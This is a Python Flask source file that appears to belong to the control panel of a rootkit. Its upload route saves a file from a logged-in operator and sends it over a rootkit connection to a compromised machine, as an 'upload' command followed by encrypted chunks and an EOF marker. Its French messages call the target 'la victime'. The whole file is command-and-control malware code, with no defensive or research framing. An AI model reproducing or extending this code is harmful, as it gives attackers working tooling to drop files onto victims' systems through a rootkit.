from app import app
import config as cfg
from flask import flash, render_template, redirect, url_for, request, session
from werkzeug.utils import secure_filename
import os
from utils.socket import send_to_server

@app.route('/upload', methods=['GET', 'POST'])
def upload():
    if not session.get('authenticated'):
        return redirect(url_for('login'))

    if request.method == 'POST':
        uploaded_file = request.files.get('file')

        if uploaded_file:
            filename = secure_filename(uploaded_file.filename)
            local_path = os.path.join(cfg.UPLOAD_FOLDER, filename)
            uploaded_file.save(local_path)

            try:
                with open(local_path, "rb") as f:
                    data = f.read()

                # Envoie la commande "upload" avec nom de fichier distant
                send_to_server(cfg.rootkit_connection, f"upload {filename}")

                # Envoie du fichier complet (automatiquement chiffré + chunké)
                send_to_server(cfg.rootkit_connection, data)

                # Envoie marqueur de fin
                send_to_server(cfg.rootkit_connection, "EOF")

                flash(f"✅ Fichier '{filename}' envoyé avec succès à la victime.")
            except Exception as e:
                flash(f"❌ Échec lors de l'envoi du fichier : {e}")

    return render_template("upload.html")
